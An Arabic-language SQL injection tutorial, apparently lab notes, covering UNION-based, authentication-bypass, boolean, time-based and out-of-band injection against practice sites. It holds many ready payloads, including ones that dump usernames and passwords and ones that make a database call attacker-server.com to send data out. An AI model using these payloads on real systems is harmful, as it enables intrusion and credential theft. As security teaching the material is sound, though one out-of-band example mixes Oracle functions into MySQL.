# SQL injection

<details>
   <summary> in-band SQLI </summary>

🧪 الجزء العملي - خطوة بخطوة
1. اكتشاف الثغرة:
افتح المتصفح، وروح للرابط اللي فيه id=1.

جرب تحط ' بعد الرقم كده:


```
id=1'
```
هتلاقي رسالة خطأ ظهرت.
ده معناه إن المدخل بتاعك داخل فعلاً جوه استعلام SQL، وده تأكيد إن فيه ثغرة.

2. نبدأ نستغلها بـ UNION
جرب كده:

```
id=1 UNION SELECT 1
```
هتلاقي رسالة خطأ بتقولك إن عدد الأعمدة مش متطابق.

جرب تزود الأعمدة:
```
id=1 UNION SELECT 1,2
```
لسه في Error؟ زود كمان:

```
id=1 UNION SELECT 1,2,3
```
كده اشتغل! ليه؟ لأن الاستعلام الأصلي بيرجع 3 أعمدة، فلازم الاتحاد يكون بنفس العدد.

3. نخلي الـ UNION يشتغل لوحده
يعني نمنع الاستعلام الأصلي من إرجاع نتيجة.

اعمل id=0 بدلاً من 1:
```
id=0 UNION SELECT 1,2,3
```
كده الصفحة هتعرض النتائج اللي انت رجعتها.

4. نعرض اسم قاعدة البيانات:
```
id=0 UNION SELECT 1,2,database()
```
هيظهر لك اسم قاعدة البيانات، مثلاً: sqli_one.

5. نعرض أسماء الجداول داخل قاعدة البيانات:
```
id=0 UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables WHERE table_schema = 'sqli_one'
```
النتيجة:
```
article,staff_users
```

يبقى فيه جدول اسمه staff_users ده غالبًا فيه اليوزرز.

6. نعرف أسماء الأعمدة داخل جدول staff_users:
```
id=0 UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_name = 'staff_users'
```
النتيجة:
```
id,username,password
```

7. نجيب اليوزرات والباسوردات:
```
id=0 UNION SELECT 1,2,group_concat(username,':',password SEPARATOR '<br>') FROM staff_users
```
هتلاقي النتائج بتظهر كده:

```
martin:123456
admin:qwerty
```


✅ ملخص سريع:

الخطوة | الهدف
------------|---------------------
' | تأكد وجود الثغرة
UNION SELECT 1,2,3 | تأكد من عدد الأعمدة
database() | جبت اسم قاعدة البيانات
information_schema.tables | جبت أسماء الجداول
information_schema.columns | جبت أسماء الأعمدة
staff_users | جبت البيانات الحساسة زي الباسورد

  
</details>






<details>
     <summary>Blind SQLI (Authentication Bypass)</summary>

      🕶️ Blind SQL Injection (الحقنة العمياء)
يعني إيه "Blind"؟
يعني مافيش رسائل خطأ، ولا داتا طالعة على الشاشة تقولك إن الهجمة نجحت.

لكن بالرغم من كده، الحقنة (injection) شغالة، بس السيرفر مابيظهرلكش حاجة مباشرة تقولك كده.

🧠 طيب نستفيد منها إزاي؟
كل اللي إحنا محتاجينه هو "رد فعل بسيط" من الموقع.
يعني مثلاً:

لو طلعلك صفحة معينة = الاستعلام نجح.

لو فضلك على نفس الصفحة = الاستعلام فشل.

وده كفاية إننا نبدأ نشتغل ونستخرج معلومات من قاعدة البيانات حتى لو بشكل بطيء.

🔓 Bypassing Authentication (تخطي تسجيل الدخول)
دي واحدة من أسهل الطرق في Blind SQLi، وممكن نكسر بيها فورم تسجيل الدخول.

🤔 إزاي بيشتغل تسجيل الدخول أصلاً؟
الموقع بيعمل استعلام بالشكل ده:

```
SELECT * FROM users WHERE username = 'ali' AND password = '123456' LIMIT 1;
```
لو فيه مستخدم بالبيانات دي، الاستعلام بيرجع صف واحد → يبقى المستخدم يدخل.

📌 إحنا نعمل إيه؟ نضحك على الاستعلام!
بدل ما نحاول نخمن Username وPassword، إحنا هنخلي الاستعلام يرجع نتيجة مهما كانت البيانات غلط.

🎯 الطريقة:
في خانة الـ Password، نكتب:

```
' OR 1=1;--
```
ده بيحوّل الاستعلام إلى:

```
SELECT * FROM users WHERE username = '' AND password = '' OR 1=1;--
```
شرحها:

'' AND '' → ده هيرجع false.

OR 1=1 → ده true دايمًا.

-- → ده بيعلّق باقي الاستعلام (يعني أي حاجة بعده مش بتتنفذ).

فالاستعلام كله بيرجع true، وكأنك سجلت دخولك بنجاح، حتى من غير Username أو Password!

✅ النتيجة:
لو الموقع معمول بشكل غير آمن، هيسمحلك بالدخول من غير بيانات صحيحة.

🛠️ ملحوظة مهمة:
لو ما نفعش:

جرب أنواع مختلفة من علامات التنصيص: " OR 1=1-- أو حتى ') OR ('1'='1.

جرب تحط القيمة في خانة الـ Username بدل Password.

🔐 ملخص سريع:



   العنصر | الوصف
   -------------|----------------
الهدف | تخطي تسجيل الدخول
نوع الهجوم | Blind SQLi
الوسيلة | استغلال منطق التحقق من صحة البيانات
الباي لود | ' OR 1=1;--
        
</details>






<details>
   <summary>Blind SQLi - (Boolean Based)</summary>

   🕵️‍♂️ يعني إيه Boolean-Based Blind SQL Injection؟
النوع ده من الـ SQLi بيشتغل على إنك ما بتاخدش بيانات واضحة من السيرفر، لكن السيرفر بيرد عليك بـ حاجة ثنائية (صح أو غلط)، زي:

true / false

1 / 0

yes / no

أو مثلًا تظهر صفحة أو ما تظهرش.

والحيلة هنا إنك تراقب رد الفعل على الاستعلام، مش البيانات نفسها.

🎯 المثال العملي:
رابط زيه كده:

```
https://website.thm/checkuser?username=admin
```
الرد بيكون حاجة شبه:

```
{"taken":true}
```
يعني اسم المستخدم موجود.

لو كتبنا:

```
https://website.thm/checkuser?username=admin123
```
هيكون الرد:

```
{"taken":false}
```
يعني الاسم مش موجود.

فهمنا كده إن فيه API بتشيك هل اسم المستخدم موجود ولا لأ.

🛠️ الاستعلام اللي السيرفر بيشغله غالبًا شكله كده:
```
SELECT * FROM users WHERE username = '%username%' LIMIT 1;
```
واحنا بنقدر نتحكم في %username% من خلال الرابط.

✅ الهدف الأول: نعرف عدد الأعمدة
نبدأ نضيف استعلام UNION، ونجرب نعرف عدد الأعمدة في الجدول.
نجرب مثلاً:

```
admin123' UNION SELECT 1;--
```
لو السيرفر رجّع false → يبقى عدد الأعمدة مش 1.
نزيد شوية:

```
admin123' UNION SELECT 1,2;--
```
برضو false → مش 2.

لحد ما نوصل:

```
admin123' UNION SELECT 1,2,3;--
```
وهنا هنلاقي {"taken": true}
يبقى كده عرفنا إن الجدول بيرجع 3 أعمدة. ✅

🔍 الهدف الثاني: نعرف اسم قاعدة البيانات
نستخدم الدالة database() اللي بترجع اسم قاعدة البيانات الحالية.

نجرب حاجة بسيطة:

```
admin123' UNION SELECT 1,2,3 WHERE database() LIKE '%';--
```
% معناها أي حاجة، فالنتيجة هتبقى true.

نجرب نحصر أكتر:

```
admin123' UNION SELECT 1,2,3 WHERE database() LIKE 'a%';--
```
لو النتيجة false → يبقى الاسم مش بيبدأ بـ a.

نكمل نحاول بالحروف:

b%

c%

... لحد ما نلاقي:

```
admin123' UNION SELECT 1,2,3 WHERE database() LIKE 's%';--
```
يعني الاسم بيبدأ بـ s.

نبدأ نحاول حرف حرف:

sa%

sb%

sq%

...

لحد ما نوصل لـ sqli_three ✅

🧱 الهدف الثالث: نكتشف أسماء الجداول
نروح على information_schema.tables ونستخدم نفس الطريقة:

```
admin123' UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_schema='sqli_three' AND table_name LIKE 'a%';--
```
لو false → نغير الحرف.

نجرب لحد ما نلاقي:

```
admin123' UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_schema='sqli_three' AND table_name='users';--
```
يبقى فيه جدول اسمه users ✅

🧩 الهدف الرابع: نكتشف أسماء الأعمدة في جدول users
نروح على:

```
information_schema.columns
```
ونجرب:

```
admin123' UNION SELECT 1,2,3 FROM information_schema.columns WHERE table_schema='sqli_three' AND table_name='users' AND column_name LIKE 'a%';--
```
كل مرة نكتشف عمود، نستبعده عشان نكمل نجيب الباقي:

```
... AND column_name != 'id'
```
وهكذا نكررها لحد ما نكتشف الأعمدة:

id

username

password ✅

🔐 الهدف الأخير: نكتشف بيانات المستخدم (اسم وكلمة مرور)
نبدأ باسم المستخدم:
```
admin123' UNION SELECT 1,2,3 FROM users WHERE username LIKE 'a%';--
```
نكرر لحد ما نعرف إن فيه username اسمه admin.

بعد كده نجيب الباسورد:
```
admin123' UNION SELECT 1,2,3 FROM users WHERE username='admin' AND password LIKE '3%';--
```
نجرب حرف حرف لحد ما نوصل للباسورد الكامل:

```
3845 ✅
```
🎉 النتيجة:
قدرنا من غير ما نشوف بيانات مباشرة نعرف:

اسم قاعدة البيانات.

اسم الجدول.

أسماء الأعمدة.

اسم المستخدم.

الباسورد.

وكل ده عن طريق الملاحظة الذكية لردود السيرفر.
   
   
</details>













<details>
   <summary>Blind SQLi - (Time Based)</summary>

   ⏱️ إيه هو Time-Based Blind SQL Injection؟
النوع ده بيشتغل على مبدأ:

"لو الاستعلام اتحقق صح، نفّذ SLEEP(x) واتأخر في الرد."

ولو ما اتأخرش، يبقى الاستعلام فشل أو ما تنفذش بالطريقة اللي إحنا عايزينها.

🔧 بنستخدم فين SLEEP()؟
في قواعد البيانات زي MySQL، فيه دالة اسمها SLEEP(5) بتخلّي السيرفر يستنى 5 ثواني قبل ما يرد.

💡 الهدف الأول: نعرف عدد الأعمدة
بنبدأ باستعلام بسيط زي:

```
admin123' UNION SELECT SLEEP(5);--
```
لو السيرفر ما اتأخرش → يبقى الاستعلام غلط.

نزوّد عمود كده:

```
admin123' UNION SELECT SLEEP(5), 2;--
```
لو حصل تأخير 5 ثواني → يبقى عدد الأعمدة = 2 ✅

لو ما حصلش، نزود:

```
admin123' UNION SELECT SLEEP(5), 2, 3;--
```
ونكمل لحد ما نحصل على التأخير → ده معناه إننا عرفنا عدد الأعمدة.

🧱 زي boolean-based، نكمل بنفس الطريقة لكن بنقيس الوقت:
🧠 اكتشاف اسم قاعدة البيانات:
نستخدم database() ومعاها شرط LIKE وسليب:

```
admin123' UNION SELECT SLEEP(5), 2 WHERE database() LIKE 's%';--
```
لو حصل تأخير → يبقى الاسم بيبدأ بـ s
لو ما حصلش → جرّب حرف تاني (a%, b%, c%, ...)

نكمّل حرف حرف:

sa%

sql%

sqli_t% ... لحد ما نوصل لـ sqli_three ✅

🧩 اكتشاف الجداول:
نروح على information_schema.tables ونكتب:

```
admin123' UNION SELECT SLEEP(5),2 FROM information_schema.tables WHERE table_schema='sqli_three' AND table_name LIKE 'u%';--
```
لو حصل تأخير → فيه جدول بيبدأ بـ u.

نجرّب أكتر لحد ما نجيب:

```
table_name = 'users'
```
🧠 اكتشاف الأعمدة:
نكرر نفس الفكرة:

```
admin123' UNION SELECT SLEEP(5),2 FROM information_schema.columns WHERE table_schema='sqli_three' AND table_name='users' AND column_name LIKE 'u%';--
```
كل مرة نكتشف عمود نعمل:

```
... AND column_name != 'username'
```
ونكررها لحد ما نكتشف: id, username, password ✅

🔓 استخراج بيانات الدخول:
أولًا: نجيب اسم المستخدم
```
admin123' UNION SELECT SLEEP(5),2 FROM users WHERE username LIKE 'a%';--
```
لحد ما نوصل لـ admin

ثانيًا: نجيب الباسورد
```
admin123' UNION SELECT SLEEP(5),2 FROM users WHERE username='admin' AND password LIKE '3%';--
```
نكمل:

38%

384%

3845 ✅

🎉 الخلاصة:
بالـ Time-Based SQLi:

بنكتشف الأعمدة من خلال زمن التأخير.

بنكرر نفس خطوات Boolean-Based لكن بذكاء مع الزمن.

الاختبار الحقيقي في المثابرة والتجريب واحدة واحدة.
   
</details>









<details>
   <summary>Out-of-Band SQLi</summary>

   📡 إيه هو Out-of-Band SQLi؟
النوع ده مش بيعتمد على ظهور بيانات مباشرة في الصفحة (زي In-Band)
ولا على تأخيرات أو استجابات منطقية (زي Boolean أو Time-based)

إنما بيعتمد على فكرة مختلفة شوية:

"أنا هبعت حاجة في الاستعلام تخلي قاعدة البيانات تتصل بجهازي أو سيرفر خارجي، وتبعتلي منه البيانات!"

يعني فيه قناتين:

🎯 قناة الهجوم = الريكوست اللي انت بعتّه للسيرفر (مثلاً POST أو GET).

📥 قناة التجميع = الاتصال اللي بيحصل من قاعدة البيانات لجهازك، زي DNS أو HTTP.

🧠 ازاي بيحصل الهجوم ده؟
خلينا نوضحها بخطوات:

🔍 تكتشف نقطة SQLi (زي أي نوع تاني).

💉 تكتب Payload خاص بيستخدم دوال زي:

LOAD_FILE()

xp_dirtree (في MSSQL)

UTL_HTTP.REQUEST() (في Oracle)

أو dnslookup() لو قاعدة البيانات تدعمها.

🌐 الاستعلام يجبر قاعدة البيانات تبعت طلب خارجي (DNS أو HTTP) لسيرفر انت بتتحكم فيه.

🛰️ انت بتراقب السيرفر ده، وتشوف البيانات وهي بتجيلك من الـ payload.

🧪 مثال عملي: (MySQL)
لو عندك دومين أو سيرفر انت بتملكه زي:

```
attacker-server.com
```
تكتب في خانة vulnerable:


```
' UNION SELECT LOAD_FILE('\\\\attacker-server.com\\data')--
```
أو (لو تشتغل مع MySQL/DNS):

```
'; SELECT extractvalue(xmltype('<?xml version="1.0"?><!DOCTYPE root [<!ENTITY % ext SYSTEM "http://attacker-server.com"> %ext;]>'),'/');--
```
ده يجبر قاعدة البيانات إنها تحاول تفتح اتصال HTTP لسيرفرك، وفيه ممكن تحط البايلود يبعَتلك داتا.

💡 في MSSQL:
```
'; exec master..xp_dirtree '\\attacker-server.com\share';--
```
ده بيخلي السيرفر يحاول يتصل على SMB Share، وده انت بتراقبه من جهازك أو سيرفرك.

🛠️ إزاي أراقب الطلبات دي؟
تشغّل أداة على جهازك أو سيرفرك زي:

🧰 Burp Collaborator أو

🛡️ Responder (لـ SMB)

🐍 أو حتى Script Python بـ Flask أو SimpleHTTPServer

🔬 DNS server مخصص، زي dnslog.cn

📛 ملحوظات مهمة:
النوع ده مش دايمًا بيشتغل، لأنه بيعتمد على:

إعدادات قاعدة البيانات

وجود صلاحيات كافية

إن الـ firewall ميسدّش الـ outgoing requests


🔐 الخلاصة:


العنصر | النوع
----------|----------------
طريقته | قناة هجوم + قناة استقبال خارجي
أدوات مساعدة | DNSLog / Burp Collaborator / Responder
يعتمد على | إرسال بيانات خارجية (HTTP, DNS, SMB)
فعال لما؟ | لما باقي الأنواع ماتديش أي feedback


   
</details>


























